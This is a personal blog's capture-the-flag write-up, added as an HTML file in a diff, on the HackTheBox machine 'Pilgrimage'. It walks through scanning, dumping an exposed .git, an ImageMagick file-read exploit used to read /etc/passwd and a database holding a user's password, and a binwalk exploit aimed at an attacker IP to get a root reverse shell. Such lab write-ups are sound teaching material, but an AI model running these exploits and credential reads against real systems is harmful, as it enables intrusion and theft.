@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content=""
+  />
+  
+    
+      <title>Pilgrimage | Mrd0zz</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+    <div id="brand">
+      <a class="icon-link" href="//localhost:1313/">
+        <img
+          class="icon"
+          src="/images/home_img.jpg"
+        />
+      </a>
+      <div class="text">
+        <a href="//localhost:1313/"><h1>Mrd0zz</h1></a>
+        <h3></h3>
+      </div>
+    </div>
+    <nav>
+      
+        
+          
+          <a href="/"><b>Home</b></a>
+        
+           | 
+          <a href="/about/"><b>About</b></a>
+        
+           | 
+          <a href="/posts/"><b>Posts</b></a>
+        
+           | 
+          <a href="/categories/"><b>Categories</b></a>
+        
+           | 
+          <a href="/tags/"><b>Tags</b></a>
+        
+      
+    </nav>
+    <hr />
+  </header>
+  
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">Pilgrimage</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2023-10-15</time>
+    <span>in</span>
+    
+      <a href="/categories/htb-easy">htb-easy</a>
+  </strong>
+  <span> • 572 words</span>
+  <span> • 3 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/imagemagick">ImageMagick</a>, 
+        <a href="/tags/binwalk">Binwalk</a>
+    </div>
+  
+</div>
+
+      <div class="content"><p>Pilgrimage is an easy machine from hackthebox which involved finding a git directory leading to a arbitrary file read vulnerability in ImageMagick. Using that read the databse file and got credentials of emily user. Found a folder named binwalk in emily&rsquo;s directory and the binary version was vulnerable to rce. One of the script malwarescan.sh was running as root user and the malicious png file generated from binwalk exploit was to be placed under the mentioned directory in this script to get shell as root user.</p>
+<h2 id="port-scan">Port Scan</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># nmap -sC -sV -p- -vv --reason --min-rate=1000 -T4 $ip -oN nmap_tcp_scan</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON  VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnPDlM1cNfnBOJE71gEOCGeNORg5gzOK/TpVSXgMLa6Ub/7KPb1hVggIf4My+cbJVk74fKabFVscFgDHtwPkohPaDU8XHdoO03vU8H04T7eqUGj/I2iqyIHXQoSC4o8Jf5ljiQi7CxWWG2t0n09CPMkwdqfEJma7BGmDtCQcmbm36QKmUv6Kho7/LgsPJGBP1kAOgUHFfYN1TEAV6TJ09OaCanDlV/fYiG+JT1BJwX5kqpnEAK012876UFfvkJeqPYXvM0+M9mB7XGzspcXX0HMbvHKXz2HXdCdGSH59Uzvjl0dM+itIDReptkGUn43QTCpf2xJlL4EeZKZCcs/gu8jkuxXpo9lFVkqgswF/zAcxfksjytMiJcILg4Ca1VVMBs66ZHi5KOz8QedYM2lcLXJGKi+7zl3i8+adGTUzYYEvMQVwjXG0mPkHHSldstWMGwjXqQsPoQTclEI7XpdlRdjS6S/WXHixTmvXGTBhNXtrETn/fBw4uhJx4dLxNSJeM<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOaVAN4bg6zLU3rUMXOwsuYZ8yxLlkVTviJbdFijyp9fSTE6Dwm4e9pNI8MAWfPq0T0Za0pK0vX02ZjRcTgv3yg<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILGkCiJaVyn29/d2LSyMWelMlcrxKVZsCCgzm6JjcH1W
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack nginx 1.18.0
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://pilgrimage.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h2 id="port-80">Port 80</h2>
+<ul>
+<li>Did directory bruteforce and found a <em><strong>.git</strong></em> directory</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/pilgrimage<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ gobuster dir -u http://pilgrimage.htb/ -w ~/wordlist/web/common.txt -t <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/.hta                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 153<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.git/HEAD            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 23<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 153<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 153<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/assets               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 169<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://pilgrimage.htb/assets/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 7621<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/tmp                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 169<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://pilgrimage.htb/tmp/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/vendor               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 169<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://pilgrimage.htb/vendor/<span style="color:#f92672">]</span>
+</span></span></code></pre></div><ul>
+<li>Used <strong>git-dumper</strong> to dump the git directory: <code>git-dumper http://pilgrimage.htb/.git/ ./pilgrimage-site</code></li>
+<li>Found a binary file name <em><strong>magick</strong></em> and searched for its version: <strong>ImageMagick 7.1.0-49</strong></li>
+<li>This version is vulnerable to <em><strong>Arbitrary file read vuln</strong></em> (<a href="https://github.com/Sybil-Scan/imagemagick-lfi-poc">https://github.com/Sybil-Scan/imagemagick-lfi-poc</a>)</li>
+<li>Following this exploit Generated a malicious png file with <em><strong>/etc/passwd</strong></em> for file content read: <code>python3 [generate.py](http://generate.py/) -f &quot;/etc/passwd&quot; -o exploit.png</code></li>
+<li>Uploaded the file on website. Downloaded the image and extracted the text from it. Then decoded the hex bytes using python</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://pilgrimage.htb/shrunk/651a9c424fa36.png
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>identify -verbose 651a9c424fa36.png
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;print(bytes.fromhex(&#34;726f6f743a78...&#34;).decode(&#34;utf-8&#34;))&#39;</span>
+</span></span></code></pre></div><ul>
+<li>We get content of <em><strong>/etc/passwd.</strong></em> Also got a user named emily</li>
+<li>In the git repository we found a file <em><strong>dashboard.php</strong></em> in which was mention of a database file <strong>sqlite:/var/db/pilgrimage</strong></li>
+<li>To get content of this file did the above same steps only changed the filename to <strong>/var/db/pilgrimage.</strong></li>
+<li>Decoding this in cyberchef we got a <em><strong>sqlite db file</strong></em></li>
+<li>Downloaded the file and opened it in a sqlite3 shell: <code>sqlite3 download.sqlite</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlite&gt; .tables
+</span></span><span style="display:flex;"><span>images  users
+</span></span><span style="display:flex;"><span>sqlite&gt; <span style="color:#66d9ef">select</span> * from users
+</span></span><span style="display:flex;"><span>   ...&gt; ;
+</span></span><span style="display:flex;"><span>emily|abigchonkyboi123
+</span></span><span style="display:flex;"><span>test|test
+</span></span><span style="display:flex;"><span>sqlite&gt;
+</span></span></code></pre></div><ul>
+<li>From here we got the credentials of emily user</li>
+</ul>
+<h2 id="enum-as-emily-user">Enum as emily user</h2>
+<ul>
+<li>In the <em><strong>.config</strong></em> directory found a <strong>binwalk</strong> folder. Looking for its version it is <strong>v2.3.2</strong></li>
+<li>Searching on <strong>searchsploit</strong> it is vulnerable to RCE.</li>
+<li>Transferred the <em><strong><a href="http://exploit.py">exploit.py</a></strong></em> file to <strong>emily’s</strong> shell and ran: <code>python3 [exploit.py](http://exploit.py/) ./image.png 10.10.14.81 8888</code></li>
+<li>It generated a malicious <em><strong>.png file.</strong></em></li>
+<li>Started the nc listener &amp; uploaded this file thru the website but the connection was not getting back</li>
+<li>Doing <code>ps -ef</code> saw two processes running as root</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root   /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
+</span></span><span style="display:flex;"><span>root   /bin/bash /usr/sbin/malwarescan.sh
+</span></span></code></pre></div><ul>
+<li>Saw contents of <em><strong><a href="http://malwarescan.sh">malwarescan.sh</a></strong></em></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>blacklist<span style="color:#f92672">=(</span><span style="color:#e6db74">&#34;Executable script&#34;</span> <span style="color:#e6db74">&#34;Microsoft executable&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | <span style="color:#66d9ef">while</span> read FILE; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>        filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/var/www/pilgrimage.htb/shrunk/</span><span style="color:#66d9ef">$(</span>/usr/bin/echo <span style="color:#e6db74">&#34;</span>$FILE<span style="color:#e6db74">&#34;</span> | /usr/bin/tail -n <span style="color:#ae81ff">1</span> | /usr/bin/sed -n -e <span style="color:#e6db74">&#39;s/^.*CREATE //p&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        binout<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>/usr/local/bin/binwalk -e <span style="color:#e6db74">&#34;</span>$filename<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> banned in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>blacklist[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$binout<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> *<span style="color:#e6db74">&#34;</span>$banned<span style="color:#e6db74">&#34;</span>* <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>                        /usr/bin/rm <span style="color:#e6db74">&#34;</span>$filename<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>                        break
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><ul>
+<li>So we need to put our <strong>malicious.png</strong> file in <strong>/var/www/pilgrimage.htb/shrunk/</strong> directory to run it as root.</li>
+<li>Copied the file there and got shell as root after some time on nc listener</li>
+</ul></div>
+    </article>
+  </main>
+
+      </div>
+      <footer>
+    <hr />
+    
+      <p id="social">
+        Find me around the web:
+        <br />
+        
+          
+          <a href="https://github.com/Mrd0zz">GitHub</a>
+        
+           | 
+          <a href="https://www.linkedin.com/in/rohans21/">Linkedin</a>
+        
+           | 
+          <a href="https://twitter.com/Mrd0zz">Twitter</a>
+        
+           | 
+          <a href="https://www.reddit.com/user/Mrd0zz/">Reddit</a>
+        
+           | 
+          <a href="https://tryhackme.com/p/r0h4n">Tryhackme</a>
+        
+           | 
+          <a href="https://app.hackthebox.com/profile/1670697">Hackthebox</a>
+        
+      </p>
+    
+    <p class="copyright">
+      Copyright © 2024
+      
+      <strong>Rohan Sharma</strong>
+      
+    </p>
+    <p class="builtWith">
+      Built with
+      <a href="http://www.gohugo.io/">Hugo</a>,
+      using the theme
+      <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>
+      
+    </p>
+  </footer>
+  
+    </div>
+  </body>
+</html>
